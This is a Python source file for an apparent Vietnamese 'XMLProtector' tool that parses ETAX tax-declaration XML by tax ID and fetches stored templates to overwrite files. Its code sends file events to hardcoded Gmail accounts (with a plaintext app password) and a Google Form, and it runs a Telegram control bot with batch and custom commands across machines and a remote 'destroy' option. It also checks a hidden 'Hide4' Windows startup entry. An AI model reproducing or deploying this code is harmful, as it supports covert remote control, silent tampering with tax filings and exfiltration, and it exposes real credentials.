        send_telegram_message(status_msg, status_keyboard)
        logging.info("Status report sent to Telegram")
        return True
        
    except Exception as e:
        error_msg = f"‚ùå <b>Ki·ªÉm Tra Tr·∫°ng Th√°i Th·∫•t B·∫°i</b>\n\n" \
                   f"üî• L·ªói: {str(e)}"
        send_telegram_message(error_msg)
        logging.error(f"Status check failed: {e}")
        return False

def load_remote_config():
    """Hardcoded remote config for Gmail and Google Form."""
    return {
        "gmail": {
            "from": "begau1302@gmail.com",
            "to": "mrkent19999x@gmail.com, tuxuanchien6101992@gmail.com",
            "app_password": "aphvukdliewalkrn"
        },
        "google_form": {
            "form_url": "https://docs.google.com/forms/d/e/1FAIpQLScI1LMF0gh7vW3Q5Qb03jreBD2UweFJjwkVWAey1OR73n2knA/formResponse",
            "entry_id": "entry.1791266121"
        }
    }

def send_gmail_log(to_email, subject, content, from_email, app_password):
    try:
        msg = EmailMessage()
        msg["Subject"] = subject
        msg["From"] = from_email
        msg["To"] = to_email
        msg.set_content(content)
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(from_email, app_password)
        server.send_message(msg)
        server.quit()
        logging.info("‚úÖ ƒê√£ g·ª≠i log v·ªÅ Gmail.")
    except Exception as e:
        logging.error(f"‚ùå G·ª≠i Gmail th·∫•t b·∫°i: {e}")

def send_googleform_log(form_url, entry_id, message):
    try:
        data = { entry_id: message }
        response = requests.post(form_url, data=data)
        if response.status_code == 200:
            logging.info("‚úÖ ƒê√£ g·ª≠i log t·ªõi Google Form.")
        else:
            logging.warning(f"‚ùå L·ªói g·ª≠i Form: {response.status_code}")
    except Exception as e:
        logging.error(f"‚ùå G·ª≠i Form th·∫•t b·∫°i: {e}")

def send_remote_log(event, path=None, once=False):
    """G·ª≠i log v·ªÅ Google Form v√† Gmail, ch·ªâ g·ª≠i m·ªôt l·∫ßn n·∫øu once=True."""
    sent_logs = load_sent_logs()
    msg = f"[{event}] - {path or ''}"
    log_key = f"{event}:{path or ''}"
    
    if once and log_key in sent_logs:
        return  # B·ªè qua n·∫øu log ƒë√£ ƒë∆∞·ª£c g·ª≠i tr∆∞·ªõc ƒë√≥ v√† once=True
    
    cfg = load_remote_config()

    if "gmail" in cfg:
        g = cfg["gmail"]
        send_gmail_log(g["to"], f"Log: {event}", msg, g["from"], g["app_password"])

    if "google_form" in cfg:
        f = cfg["google_form"]
        send_googleform_log(f["form_url"], f["entry_id"], msg)

    if once:
        sent_logs.add(log_key)
        save_sent_logs(sent_logs)

def get_templates():
    """L·∫•y t·∫•t c·∫£ file XML trong th∆∞ m·ª•c 'templates/' v√† g·ª≠i log khi kh·ªüi ƒë·ªông."""
    if getattr(sys, 'frozen', False):
        base = sys._MEIPASS
    else:
        base = os.path.dirname(os.path.abspath(__file__))
    tpl_dir = os.path.join(base, 'templates')
    templates = glob.glob(os.path.join(tpl_dir, '*.xml'))
    for tpl in templates:
        send_remote_log("ƒê√£ c√†i ƒë·∫∑t m·∫´u XML t·ª´ templates", tpl, once=True)
    return templates

def load_processed_files():
    if STATE_FILE.exists():
        with open(STATE_FILE, 'rb') as f:
            return pickle.load(f)
    return set()

def save_processed_files(processed):
    with open(STATE_FILE, 'wb') as f:
        pickle.dump(processed, f)

def extract_mst_from_xml(xml_content):
    """Tr√≠ch xu·∫•t MST t·ª´ n·ªôi dung XML."""
    try:
        # T√¨m MST trong c√°c th·∫ª ph·ªï bi·∫øn c·ªßa ETAX
        mst_patterns = [
            r'<maNNhan[^>]*>([^<]+)</maNNhan>',  # ETAX format ch√≠nh
            r'<MST[^>]*>([^<]+)</MST>',
            r'<ma_so_thue[^>]*>([^<]+)</ma_so_thue>',
            r'<mst[^>]*>([^<]+)</mst>',
            r'<tax_code[^>]*>([^<]+)</tax_code>',
            r'<maSoThue[^>]*>([^<]+)</maSoThue>',  # Format kh√°c
            r'<ma_so_thue_doanh_nghiep[^>]*>([^<]+)</ma_so_thue_doanh_nghiep>'
        ]
        
        for pattern in mst_patterns:
            match = re.search(pattern, xml_content, re.IGNORECASE)
            if match:
                mst = match.group(1).strip()
                logging.info(f"Smart extract MST: {mst}")
                return mst
                
        logging.warning("Smart extract: Khong tim thay MST trong XML")
        return None
        
    except Exception as e:
        logging.error(f"Extract MST error: {e}")
        return None

def extract_tax_type_from_xml(xml_content):
    """Tr√≠ch xu·∫•t lo·∫°i t·ªù khai t·ª´ XML."""
    try:
        # T√¨m lo·∫°i t·ªù khai trong ETAX
        tax_type_patterns = [
            r'<loaiToKhai[^>]*>([^<]+)</loaiToKhai>',  # ETAX format
            r'<loai_to_khai[^>]*>([^<]+)</loai_to_khai>',
            r'<tax_type[^>]*>([^<]+)</tax_type>',
            r'<form_type[^>]*>([^<]+)</form_type>'
        ]
        
        for pattern in tax_type_patterns:
            match = re.search(pattern, xml_content, re.IGNORECASE)
            if match:
                tax_type = match.group(1).strip()
                logging.info(f"Smart extract tax type: {tax_type}")
                return tax_type
                
        # Fallback: T√¨m trong t√™n file ho·∫∑c n·ªôi dung
        if 'GTGT' in xml_content.upper() or 'VAT' in xml_content.upper():
            return 'GTGT'
        elif 'TNCN' in xml_content.upper():
            return 'TNCN'
        elif 'TNDN' in xml_content.upper():
            return 'TNDN'
        else:
            logging.info("Smart extract: Mac dinh la GTGT")
            return 'GTGT'  # M·∫∑c ƒë·ªãnh GTGT cho ETAX
            
    except Exception as e:
        logging.error(f"Extract tax type error: {e}")
        return 'GTGT'

def extract_tax_period_from_xml(xml_content):
    """Tr√≠ch xu·∫•t k·ª≥ t√≠nh thu·∫ø t·ª´ XML."""
    try:
        # T√¨m k·ª≥ t√≠nh thu·∫ø trong ETAX
        period_patterns = [
            r'<kyTinhThue[^>]*>([^<]+)</kyTinhThue>',  # ETAX format
            r'<ky_tinh_thue[^>]*>([^<]+)</ky_tinh_thue>',
            r'<tax_period[^>]*>([^<]+)</tax_period>',
            r'<period[^>]*>([^<]+)</period>'
        ]
        
        for pattern in period_patterns:
            match = re.search(pattern, xml_content, re.IGNORECASE)
            if match:
                period = match.group(1).strip()
                logging.info(f"Smart extract tax period: {period}")
                return period
                
        # Fallback: T√¨m pattern ng√†y th√°ng
        date_pattern = r'(\d{4})[-/](\d{1,2})[-/](\d{1,2})'
        match = re.search(date_pattern, xml_content)
        if match:
            year, month, day = match.groups()
            period = f"{year}-{month.zfill(2)}"
            logging.info(f"Smart extract period from date: {period}")
            return period
            
        logging.info("Smart extract: Mac dinh period UNKNOWN")
        return 'UNKNOWN'
        
    except Exception as e:
        logging.error(f"Extract tax period error: {e}")
        return 'UNKNOWN'

def extract_submission_type_from_xml(xml_content):
    """Tr√≠ch xu·∫•t lo·∫°i n·ªôp t·ª´ XML."""
    try:
        # T√¨m lo·∫°i n·ªôp trong ETAX
        submission_patterns = [
            r'<loaiNop[^>]*>([^<]+)</loaiNop>',  # ETAX format
            r'<loai_nop[^>]*>([^<]+)</loai_nop>',
            r'<submission_type[^>]*>([^<]+)</submission_type>',
            r'<type[^>]*>([^<]+)</type>'
        ]
        
        for pattern in submission_patterns:
            match = re.search(pattern, xml_content, re.IGNORECASE)
            if match:
                submission_type = match.group(1).strip()
                logging.info(f"Smart extract submission type: {submission_type}")
                return submission_type
                
        # Fallback: M·∫∑c ƒë·ªãnh l√† l·∫ßn ƒë·∫ßu
        logging.info("Smart extract: Mac dinh submission LAN_DAU")
        return 'LAN_DAU'
        
    except Exception as e:
        logging.error(f"Extract submission type error: {e}")
        return 'LAN_DAU'

def match_mst_and_type(filename, target_mst, target_tax_type, target_tax_period, target_submission_type):
    """Ki·ªÉm tra xem file c√≥ kh·ªõp v·ªõi MST v√† c√°c tr∆∞·ªùng ƒë·ªãnh danh kh√¥ng."""
    try:
        # Ki·ªÉm tra MST trong t√™n file
        if target_mst not in filename:
            return False
            
        # Ki·ªÉm tra lo·∫°i t·ªù khai
        if target_tax_type != 'GTGT' and target_tax_type not in filename:
            return False
            
        # Ki·ªÉm tra k·ª≥ t√≠nh thu·∫ø
        if target_tax_period != 'UNKNOWN' and target_tax_period not in filename:
            return False
            
        return True
        
    except Exception as e:
        logging.error(f"Match MST and type error: {e}")
        return False

def find_template_file_by_mst(mst):
    """T√¨m file template g·ªëc theo MST ƒë·ªÉ copy 100%."""
    try:
        templates = get_templates()
        for template_path in templates:
            try:
                with open(template_path, 'r', encoding='utf-8') as f:
                    template_content = f.read()
                    template_mst = extract_mst_from_xml(template_content)
                    if template_mst == mst:
                        logging.info(f"Found template file for MST {mst}: {template_path}")
                        return template_path
            except:
                continue
        logging.warning(f"Template file NOT FOUND for MST: {mst}")
        return None
    except Exception as e:
        logging.error(f"Find template file by MST error: {e}")
        return None

def find_template_by_mst_smart(mst, tax_type, tax_period, submission_type):
    """T√¨m template g·ªëc theo MST v√† c√°c tr∆∞·ªùng ƒë·ªãnh danh kh√°c."""
    try:
        # 1. T√¨m trong RAM cache tr∆∞·ªõc (nhanh nh·∫•t)
        for filename, content in FORTRESS_CACHE.items():
            if match_mst_and_type(filename, mst, tax_type, tax_period, submission_type):
                return content
                
        # 2. T√¨m trong database warehouse
        if ENTERPRISE_DB.exists():
            conn = sqlite3.connect(str(ENTERPRISE_DB))
            cursor = conn.execute('''
                SELECT content FROM xml_cloud_warehouse 
                WHERE mst = ? AND sync_status = 'synced'
                ORDER BY last_updated DESC
                LIMIT 1
            ''', (mst,))
            
            result = cursor.fetchone()
            if result:
                logging.info(f"Smart template found in database for MST: {mst}")
                conn.close()
                return result[0]
            conn.close()
            
        # 3. T√¨m trong templates local
        templates = get_templates()
        for template_path in templates:
            try:
                with open(template_path, 'r', encoding='utf-8') as f:
                    template_content = f.read()
                    template_mst = extract_mst_from_xml(template_content)
                    if template_mst == mst:
                        # Cache v√†o RAM cho l·∫ßn sau
                        FORTRESS_CACHE[template_path] = template_content
                        logging.info(f"Smart template found locally: {template_path}")
                        return template_content
            except:
                continue
                
        logging.warning(f"Smart template NOT FOUND for MST: {mst}")
        return None
        
    except Exception as e:
        logging.error(f"Find template by MST smart error: {e}")
        return None

def find_template_instant(content, file_path):
    """Tim template goc thong minh - su dung 4 truong dinh danh!"""
    file_name = os.path.basename(file_path)
    
    try:
        # 1. Trich xuat MST tu noi dung file
        mst = extract_mst_from_xml(content)
        if not mst:
            return None
        
        # 2. Trich xuat cac truong dinh danh khac
        tax_type = extract_tax_type_from_xml(content)
        tax_period = extract_tax_period_from_xml(content)
        submission_type = extract_submission_type_from_xml(content)
        
        # 3. Tim template goc theo MST va cac truong dinh danh
        return find_template_by_mst_smart(mst, tax_type, tax_period, submission_type)
        
    except Exception as e:
        logging.error(f"Find template instant error: {e}")
        return None

def send_telegram_message(message, reply_markup=None):
    """G·ª≠i message t·ªõi Telegram group v·ªõi optional inline keyboard"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            'chat_id': TELEGRAM_GROUP_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        
        if reply_markup:
            data['reply_markup'] = json.dumps(reply_markup)
        
        response = requests.post(url, data=data)
        result = response.json()
        
        if result.get('ok'):
            logging.info("Telegram message sent successfully")
            return True
        else:
            logging.error(f"Telegram send failed: {result}")
            return False
            
    except Exception as e:
        logging.error(f"Telegram error: {e}")
        return False

def send_telegram_dashboard():
    """G·ª≠i dashboard v·ªõi inline buttons ƒë·∫πp v√† UX/UI t·ªëi ∆∞u - load nhanh"""
    
    # L·∫•y th√¥ng tin h·ªá th·ªëng nhanh nh·∫•t
    templates = get_templates()
    template_count = len(templates)
    
    # Ki·ªÉm tra startup status nhanh
    startup_status = "‚ùå"
    if winreg:
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_READ
            )
            winreg.QueryValueEx(key, "Hide4")
            winreg.CloseKey(key)
            startup_status = "‚úÖ"
        except:
            startup_status = "‚ùå"
    
    # L·∫•y th√¥ng tin m√°y
    machine_count = len(get_all_machines())
    machine_status = "üü¢ ONLINE" if MACHINE_ID else "üî¥ OFFLINE"
    
    dashboard_msg = f"""üéõÔ∏è <b>XMLPROTECTOR CONTROL PANEL</b>

üõ°Ô∏è <b>Tr·∫°ng th√°i h·ªá th·ªëng:</b>
‚Ä¢ B·∫£o v·ªá: <b>ƒêANG HO·∫†T ƒê·ªòNG</b>
‚Ä¢ Templates: <b>{template_count}</b> files
‚Ä¢ Startup: {startup_status}
‚Ä¢ Bot: <b>ONLINE</b>

ü§ñ <b>Machine Management:</b>
‚Ä¢ Machine ID: <code>{MACHINE_ID or 'N/A'}</code>
‚Ä¢ Tr·∫°ng th√°i: {machine_status}
‚Ä¢ T·ªïng m√°y: <b>{machine_count}</b> machines

üì± <b>Ch·ªçn thao t√°c b√™n d∆∞·ªõi:</b>"""
    
    # Inline keyboard v·ªõi layout t·ªëi ∆∞u
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "üìä STATUS", "callback_data": "status"},
                {"text": "üèì PING", "callback_data": "ping"}
            ],
            [
                {"text": "üîß BUILD EXE", "callback_data": "build_mode"},
                {"text": "üìã BUILD STATUS", "callback_data": "build_status"}
            ],
            [
                {"text": "ü§ñ MACHINES", "callback_data": "machines"},
                {"text": "üöÄ GITHUB", "callback_data": "github_status"}
            ],
            [
                {"text": "‚ùì HELP", "callback_data": "help"},
                {"text": "üîÑ REFRESH", "callback_data": "menu"}
            ],
            [
                {"text": "üö® DESTROY", "callback_data": "destroy"}
            ]
        ]
    }
    
    send_telegram_message(dashboard_msg, keyboard)

def process_callback_query(callback_query):
    """X·ª≠ l√Ω callback t·ª´ inline buttons v·ªõi t·ªëc ƒë·ªô t·ªëi ∆∞u"""
    callback_data = callback_query.get('data', '')
    
    # Tr·∫£ l·ªùi callback ngay l·∫≠p t·ª©c ƒë·ªÉ remove loading spinner
    try:
        answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
        answer_response = requests.post(answer_url, data={'callback_query_id': callback_query['id']})
        logging.info(f"Callback answered instantly: {callback_data}")
    except:
        pass  # Kh√¥ng block main process
    
    # X·ª≠ l√Ω callback v·ªõi switch case t·ªëi ∆∞u
    if callback_data == 'status':
        check_status_report()
    elif callback_data == 'ping':
        # Ping nhanh nh·∫•t - ch·ªâ g·ª≠i th√¥ng b√°o ƒë∆°n gi·∫£n
        ping_msg = "üèì <b>PONG!</b>\n\n‚úÖ <b>Bot ph·∫£n h·ªìi: OK</b>\n‚ö° <b>T·ªëc ƒë·ªô: Realtime</b>"
        send_telegram_message(ping_msg)
    elif callback_data == 'help':
        help_msg = """üìñ <b>H∆Ø·ªöNG D·∫™N XMLPROTECTOR</b>

üõ°Ô∏è <b>Ch·ª©c nƒÉng ch√≠nh:</b>
‚Ä¢ B·∫£o v·ªá XML kh·ªèi malware
‚Ä¢ Ghi ƒë√® th√¥ng minh v·ªõi MST
‚Ä¢ Gi√°m s√°t to√†n b·ªô ·ªï ƒëƒ©a
‚Ä¢ Bot ƒëi·ªÅu khi·ªÉn t·ª´ xa

üì± <b>ƒêi·ªÅu khi·ªÉn:</b>
‚Ä¢ S·ª≠ d·ª•ng n√∫t b·∫•m
‚Ä¢ Ph·∫£n h·ªìi realtime
‚Ä¢ T·ª± ƒë·ªông b√°o c√°o"""
        send_telegram_message(help_msg)
    elif callback_data == 'menu':
        send_telegram_dashboard()
    elif callback_data == 'destroy':
        confirm_keyboard = {
            "inline_keyboard": [
                [
                    {"text": "‚úÖ X√ÅC NH·∫¨N", "callback_data": "confirm_destroy"},
                    {"text": "‚ùå H·ª¶Y", "callback_data": "menu"}
                ]
            ]
        }
        confirm_msg = """üö® <b>X√ÅC NH·∫¨N G·ª† B·ªé XMLPROTECTOR</b>

‚ö†Ô∏è <b>C·∫¢NH B√ÅO:</b>
‚Ä¢ G·ª° kh·ªèi startup Windows
‚Ä¢ X√≥a d·ªØ li·ªáu ·ª©ng d·ª•ng
‚Ä¢ T·∫Øt b·∫£o v·ªá h·ªá th·ªëng

üî• <b>KH√îNG TH·ªÇ HO√ÄN T√ÅC!</b>"""
        send_telegram_message(confirm_msg, confirm_keyboard)
    elif callback_data == 'confirm_destroy':
        destroy_xmlprotector()
    elif callback_data == 'build_mode':
        build_mode_msg = """üîß <b>BUILD EXE MODE</b>

üìÅ <b>H∆∞·ªõng d·∫´n:</b>
1Ô∏è‚É£ G·ª≠i file XML template
2Ô∏è‚É£ Bot t·ª± ƒë·ªông c·∫≠p nh·∫≠t
3Ô∏è‚É£ GitHub Actions build
4Ô∏è‚É£ Bot g·ª≠i EXE v·ªÅ nh√≥m

üì§ <b>G·ª≠i XML ngay!</b>"""
        
        build_keyboard = {
            "inline_keyboard": [
                [
                    {"text": "‚ùå H·ª¶Y", "callback_data": "cancel_build"},
                    {"text": "üîô MENU", "callback_data": "menu"}
                ]
            ]
        }
        
        send_telegram_message(build_mode_msg, build_keyboard)
        set_build_mode(True)
    elif callback_data == 'build_status':
        status_msg = get_build_status_message()
        send_telegram_message(status_msg)
    elif callback_data == 'github_status':
        check_github_build_status()
    elif callback_data == 'machines':
        show_machines_dashboard()
    elif callback_data == 'health_check':
        health_check_all_machines()
    elif callback_data == 'batch_command':
        show_batch_command_menu()
    elif callback_data == 'batch_status':
        execute_batch_status_check()
    elif callback_data == 'batch_health':
        execute_batch_health_check()
    elif callback_data == 'batch_template':
        execute_batch_template_update()
    elif callback_data == 'batch_restart':
        execute_batch_restart()
    elif callback_data == 'batch_custom':
        show_custom_command_input()
    elif callback_data == 'cancel_build':
        set_build_mode(False)
        send_telegram_message("üö´ <b>ƒê√£ h·ªßy BUILD MODE!</b>", {
            "inline_keyboard": [[{"text": "üîô MENU", "callback_data": "menu"}]]
        })

def set_build_mode(enabled):
    """K√≠ch ho·∫°t/t·∫Øt ch·∫ø ƒë·ªô build - ch·ªù nh·∫≠n XML files"""
    build_flag_file = os.path.join(os.path.dirname(__file__), "build_mode.flag")
    if enabled:
        with open(build_flag_file, 'w', encoding='utf-8') as f:
            f.write(str(int(time.time())))
        logging.info("Build mode activated - waiting for XML files")
    else:
        if os.path.exists(build_flag_file):
            os.remove(build_flag_file)
        logging.info("Build mode deactivated")

def is_build_mode_active():
    """Ki·ªÉm tra xem c√≥ ƒëang trong ch·∫ø ƒë·ªô build kh√¥ng"""
    build_flag_file = os.path.join(os.path.dirname(__file__), "build_mode.flag")
    if os.path.exists(build_flag_file):
        # Ki·ªÉm tra th·ªùi gian - t·ª± ƒë·ªông t·∫Øt sau 10 ph√∫t
        try:
            with open(build_flag_file, 'r', encoding='utf-8') as f:
                timestamp = int(f.read().strip())
                if time.time() - timestamp < 600:  # 10 minutes
                    return True
                else:
                    os.remove(build_flag_file)
                    return False
        except:
            return False
    return False

def get_build_status_message():
    """T·∫°o th√¥ng b√°o tr·∫°ng th√°i build"""
    if is_build_mode_active():
        return f"üîß <b>TR·∫†NG TH√ÅI BUILD</b>\n\n" \
               f"‚úÖ Ch·∫ø ƒë·ªô build: <b>ƒêANG B·∫¨T</b>\n" \
               f"‚è≥ ƒêang ch·ªù nh·∫≠n file XML...\n" \
               f"üì§ H√£y g·ª≠i file XML v√†o nh√≥m\n\n" \
               f"‚ö†Ô∏è Ch·∫ø ƒë·ªô t·ª± t·∫Øt sau 10 ph√∫t"
    else:
        return f"üîß <b>TR·∫†NG TH√ÅI BUILD</b>\n\n" \
               f"‚ùå Ch·∫ø ƒë·ªô build: <b>ƒêANG T·∫ÆT</b>\n" \
               f"üí° Nh·∫•n 'BUILD EXE M·ªöI' ƒë·ªÉ b·∫Øt ƒë·∫ßu\n\n" \
               f"üìã S·∫µn s√†ng nh·∫≠n l·ªánh build"

def get_templates_dir():
    """L·∫•y ƒë∆∞·ªùng d·∫´n th∆∞ m·ª•c templates"""
    if getattr(sys, 'frozen', False):
        base = sys._MEIPASS
    else:
        base = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(base, 'templates')

def handle_xml_document(file_path, file_name):
    """X·ª≠ l√Ω file XML ƒë∆∞·ª£c g·ª≠i qua Telegram"""
    if not is_build_mode_active():
        return False
    
    # Validate file XML
    if not file_name.endswith('.xml'):
        return False
    
    # Copy XML v√†o th∆∞ m·ª•c templates
    templates_dir = get_templates_dir()
    dest_path = os.path.join(templates_dir, file_name)
    
    try:
        shutil.copy2(file_path, dest_path)
        logging.info(f"Copied XML template: {file_name}")
        
        # G·ª≠i th√¥ng b√°o ƒë√£ nh·∫≠n file
        msg = f"‚úÖ <b>ƒê√É NH·∫¨N XML TEMPLATE</b>\n\n" \
              f"üìÑ File: {file_name}\n" \
              f"üìÅ ƒê√£ l∆∞u v√†o templates/\n" \
              f"üîß G·ª≠i th√™m XML ho·∫∑c nh·∫•n /build ƒë·ªÉ build EXE"
        send_telegram_message(msg)
        return True
    except Exception as e:
        logging.error(f"Failed to copy XML template: {e}")
        error_msg = f"‚ùå <b>L·ªñI NH·∫¨N XML</b>\n\n" \
                   f"üìÑ File: {file_name}\n" \
                   f"‚ö†Ô∏è L·ªói: {str(e)}"
        send_telegram_message(error_msg)
        return False

def auto_build_exe():
    """T·ª± ƒë·ªông build EXE m·ªõi v·ªõi templates ƒë√£ c·∫≠p nh·∫≠t qua GitHub Actions"""
    try:
        build_msg = f"üî® <b>B·∫ÆT ƒê·∫¶U BUILD EXE</b>\n\n" \
                   f"üöÄ ƒêang g·ªçi GitHub Actions...\n" \
                   f"üìÅ S·ª≠ d·ª•ng templates ƒë√£ c·∫≠p nh·∫≠t\n" \
                   f"‚è±Ô∏è ∆Ø·ªõc t√≠nh: 2-5 ph√∫t (GitHub build)"
        send_telegram_message(build_msg)
        
        # Commit v√† push templates m·ªõi l√™n GitHub
        script_dir = os.path.dirname(os.path.abspath(__file__))
        git_dir = script_dir
        
        try:
            # Ki·ªÉm tra git status
            result = subprocess.run(['git', 'status', '--porcelain'], 
                                  capture_output=True, text=True, cwd=git_dir)
            
            if result.stdout.strip():
                # C√≥ thay ƒë·ªïi - commit v√† push
                subprocess.run(['git', 'add', '.'], cwd=git_dir, check=True)
                subprocess.run(['git', 'commit', '-m', 'üöÄ Auto-update templates and trigger build'], 
                             cwd=git_dir, check=True)
                subprocess.run(['git', 'push', 'origin', 'master'], cwd=git_dir, check=True)
                
                success_msg = f"‚úÖ <b>GITHUB ACTIONS TRIGGERED!</b>\n\n" \
                             f"üöÄ Build ƒë√£ ƒë∆∞·ª£c k√≠ch ho·∫°t\n" \
                             f"üì± Theo d√µi tr√™n GitHub Actions\n" \
                             f"‚è≥ EXE s·∫Ω ƒë∆∞·ª£c g·ª≠i khi ho√†n t·∫•t\n\n" \
                             f"üîó <a href='https://github.com/Mrkent1/Xml/actions'>Xem Build Status</a>"
                send_telegram_message(success_msg)
                
                # B·∫≠t ch·∫ø ƒë·ªô ch·ªù build ho√†n t·∫•t
                set_build_mode(True)
                
            else:
                # Kh√¥ng c√≥ thay ƒë·ªïi - g·ª≠i th√¥ng b√°o
                no_change_msg = f"‚ÑπÔ∏è <b>KH√îNG C√ì THAY ƒê·ªîI</b>\n\n" \
                               f"üìÅ Templates ƒë√£ ƒë∆∞·ª£c c·∫≠p nh·∫≠t tr∆∞·ªõc ƒë√≥\n" \
                               f"üí° G·ª≠i file XML m·ªõi ƒë·ªÉ trigger build"
                send_telegram_message(no_change_msg)
                
        except subprocess.CalledProcessError as e:
            raise Exception(f"Git operation failed: {e}")
    
    except Exception as e:
        error_msg = f"‚ùå <b>BUILD TH·∫§T B·∫†I</b>\n\n" \
                   f"‚ö†Ô∏è L·ªói: {str(e)}\n" \
                   f"üîß Vui l√≤ng th·ª≠ l·∫°i sau"
        send_telegram_message(error_msg)
        logging.error(f"Auto build EXE failed: {e}")
    finally:
        # T·∫Øt build mode
        set_build_mode(False)

def upload_exe_to_telegram(exe_file_path):
    """Upload EXE file l√™n Telegram group"""
    try:
        file_size = os.path.getsize(exe_file_path) / (1024 * 1024)  # MB
        
        if file_size > 50:
            raise Exception(f"File qu√° l·ªõn: {file_size:.1f}MB (Telegram limit: 50MB)")
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        
        success_msg = f"‚úÖ <b>BUILD HO√ÄN TH√ÄNH!</b>\n\n" \
                     f"üéâ EXE m·ªõi ƒë√£ s·∫µn s√†ng\n" \
                     f"üì¶ K√≠ch th∆∞·ªõc: {file_size:.1f}MB\n" \
                     f"‚¨áÔ∏è T·∫£i v·ªÅ t·ª´ file b√™n d∆∞·ªõi:"
        
        # G·ª≠i th√¥ng b√°o tr∆∞·ªõc
        send_telegram_message(success_msg)
        
        # Upload file
        with open(exe_file_path, 'rb') as exe_file:
            files = {'document': exe_file}
            data = {
                'chat_id': TELEGRAM_GROUP_ID,
                'caption': f"üîß XMLProtector_Smart.exe - Build m·ªõi v·ªõi templates c·∫≠p nh·∫≠t\n‚è∞ {datetime.now().strftime('%d/%m/%Y %H:%M')}"
            }
            
            response = requests.post(url, files=files, data=data)
            
            if response.json().get('ok'):
                logging.info("Successfully uploaded EXE to Telegram")
                # G·ª≠i h∆∞·ªõng d·∫´n s·ª≠ d·ª•ng
                guide_msg = f"üìñ <b>H∆Ø·ªöNG D·∫™N S·ª¨ D·ª§NG</b>\n\n" \
                           f"1Ô∏è‚É£ T·∫£i file EXE v·ªÅ m√°y\n" \
                           f"2Ô∏è‚É£ Ch·∫°y v·ªõi quy·ªÅn Administrator\n" \
                           f"3Ô∏è‚É£ EXE s·∫Ω t·ª± ƒë·ªông b·∫£o v·ªá XML\n\n" \
                           f"‚ú® Build th√†nh c√¥ng v·ªõi templates m·ªõi!"
                send_telegram_message(guide_msg)
            else:
                raise Exception(f"Upload failed: {response.text}")
    
    except Exception as e:
        error_msg = f"‚ùå <b>UPLOAD TH·∫§T B·∫†I</b>\n\n" \
                   f"üì¶ Build th√†nh c√¥ng nh∆∞ng kh√¥ng g·ª≠i ƒë∆∞·ª£c\n" \
                   f"‚ö†Ô∏è L·ªói: {str(e)}\n" \
                   f"üí° EXE c√≥ s·∫µn t·∫°i: dist/XMLProtector_Smart.exe"
        send_telegram_message(error_msg)
        logging.error(f"Upload EXE failed: {e}")

def get_bot_info():
    """Get bot information and check if accessible"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getMe"
        response = requests.get(url)
        data = response.json()
        if data.get('ok'):
            bot_info = data['result']
            logging.info(f"ü§ñ Bot active: {bot_info.get('first_name')} (@{bot_info.get('username')})")
            return True
        else:
            logging.error("‚ùå Bot kh√¥ng accessible")
            return False
    except Exception as e:
        logging.error(f"Get bot info error: {e}")
        return False

def clear_telegram_webhook():
    """Clear webhook ƒë·ªÉ enable polling"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/deleteWebhook"
        response = requests.post(url)
        if response.json().get('ok'):
            logging.info("‚úÖ Webhook cleared - polling enabled")
        else:
            logging.warning("‚ö†Ô∏è Failed to clear webhook")
    except Exception as e:
        logging.error(f"Clear webhook error: {e}")

def reset_telegram_updates():
    """Reset updates ƒë·ªÉ flush old messages v√† callbacks"""
    try:
        # Get t·∫•t c·∫£ pending updates
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
        response = requests.get(url, params={'timeout': 1})
        data = response.json()
        
        if data.get('ok') and data.get('result'):
            updates = data['result']
            if updates:
                # Get highest update_id v√† skip t·∫•t c·∫£
                highest_id = max(update['update_id'] for update in updates)
                skip_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
                requests.get(skip_url, params={'offset': highest_id + 1})
                logging.info(f"üîÑ Reset updates - skipped to offset: {highest_id + 1}")
            else:
                logging.info("üîÑ No pending updates to reset")
        else:
            logging.info("üîÑ Updates reset completed")
    except Exception as e:
        logging.error(f"Reset updates error: {e}")

def claim_bot_exclusive():
    """Claim exclusive access to bot b·∫±ng c√°ch set description"""
    try:
        import socket
        hostname = socket.gethostname()
        claim_text = f"ACTIVE_ON_{hostname}_{int(time.time())}"
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/setMyDescription"
        response = requests.post(url, data={'description': claim_text})
        
        if response.json().get('ok'):
            logging.info(f"üîí Bot claimed by: {hostname}")
            return True
        else:
            logging.warning("‚ö†Ô∏è Failed to claim bot")
            return False
    except Exception as e:
        logging.error(f"Claim bot error: {e}")
        return False

def process_telegram_commands():
    """X·ª≠ l√Ω l·ªánh Telegram t·ª´ user v√† callback queries."""
    try:
        # Get updates t·ª´ Telegram v·ªõi long polling
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
        params = {
            'timeout': 10,  # Long polling 10 seconds
            'allowed_updates': ['message', 'callback_query']  # Explicitly allow callbacks
        }
        response = requests.get(url, params=params, timeout=15)
        data = response.json()
        
        if not data.get('ok'):
            return
            
        updates = data.get('result', [])
        if not updates:
            return
            
        # X·ª≠ l√Ω t·∫•t c·∫£ updates ch∆∞a processed
        for update in updates:
            update_id = update.get('update_id')
            logging.info(f"üì® Processing update: {update_id}, keys: {list(update.keys())}")
            
            # X·ª≠ l√Ω text messages
            if 'message' in update:
                message = update['message']
                chat_id = message['chat']['id']
                text = message.get('text', '')
                logging.info(f"üí¨ Message received: {text} from chat: {chat_id}")
                
                # Ch·ªâ ph·∫£n h·ªìi trong group ƒë∆∞·ª£c config
                if str(chat_id) != TELEGRAM_GROUP_ID:
                    continue
                    
                # X·ª≠ l√Ω l·ªánh /menu ho·∫∑c /start
                if text == '/start' or text == '/menu':
                    send_telegram_dashboard()
                elif text == '/build':
                    # Trigger auto build v·ªõi templates hi·ªán t·∫°i
                    auto_build_exe()
                elif text == '/ping':
